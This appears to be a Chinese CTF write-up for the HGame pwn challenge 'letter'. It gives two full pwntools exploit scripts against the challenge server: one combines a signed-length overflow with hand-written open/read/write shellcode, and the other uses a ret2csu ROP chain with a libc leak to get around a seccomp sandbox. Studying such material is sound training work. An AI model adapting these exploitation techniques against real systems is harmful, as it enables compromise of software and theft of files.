---
title: Shellcode
categories: 
    - Stack
    - Shellcode
---
# Shellcode
<!--more-->
## HGame
### letter

![20210307191837](https://raw.githubusercontent.com/YTrick/image/branch/image/20210307191837.png)

程序禁用了一些系统调用，导致无法直接用 shellcode 直接getshell ，即 asm(shellcraft.sh())，所以得手写汇编 shellcode；因为程序是64位的，所以要写 context.arch = 'amd64'


![20210307194929](https://raw.githubusercontent.com/YTrick/image/branch/image/20210307194929.png)

负数溢出，但是没搞明白的是为什么是 -268376833 。。。。当事人非常郁闷

exp:

```py
from pwn import *
context.arch = 'amd64'
context.log_level='debug'
#r = process('./letter')
r=remote('182.92.108.71',31305)
r.sendlineafter('?','-268376833')
#r.sendline('a'*0x18+p64(0x60105c)+asm(shellcraft.sh()))
shellcode = '''
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0x67616c66
xor [rsp], rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall
xor rax, rax
mov rdi, 3
mov rsi, 0x601070
mov rdx, 0x100
syscall
mov rax, 1
mov rdi, 1
mov rsi, 0x601070
mov rdx,0x100
syscall
'''
r.sendline('a'*0x18+p64(0x60108C)+asm(shellcode))
r.interactive()

```


发现其他师傅有另外的解法

exp：

```py
from pwn import*
context.log_level = 'debug'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./letter')
context.arch = elf.arch
def pr(a,addr):
	log.success(a+'====>'+hex(addr))
write_plt = elf.plt['write']
write_got = elf.got['write']
read_got = elf.got['read']
prdi = 0x400AA3
p6 = 0x400A9A
mmmc = 0x400A80
vuln = 0x400958
p = remote('182.92.108.71',31305)
#p = process('./letter')
#gdb.attach(p,'b *0x4009BB')
p.sendafter('?\n',str(0xffffffff).ljust(0x10,'\x00'))
payload = 'a'*0x18+p64(p6)+p64(0)+p64(1)+p64(write_got)+p64(1)+p64(write_got)+p64(8)
payload += p64(mmmc)+'a'*16+p64(0x00601000+0x500+0x10)+'a'*32+p64(0x4009DD)
p.send(payload)
p.recvuntil('.\n')
write_leak = u64(p.recv(8))
libcbase = write_leak - libc.sym['write']
open_addr = libcbase + libc.sym['open']
pr('libcbase',libcbase)

payload = 'a'*0x18+p64(0x00601000+0x500+0x10+0x10)+asm(shellcraft.open('flag'))
payload += asm(shellcraft.read(3,0x00601000+0x500+0x100,100))
payload += asm(shellcraft.write(1,0x00601000+0x500+0x100,100))
p.sendline(payload)

p.interactive()
```


搞不懂控制 rbp 为 0x00601000+0x500+0x10 是为什么。。。。


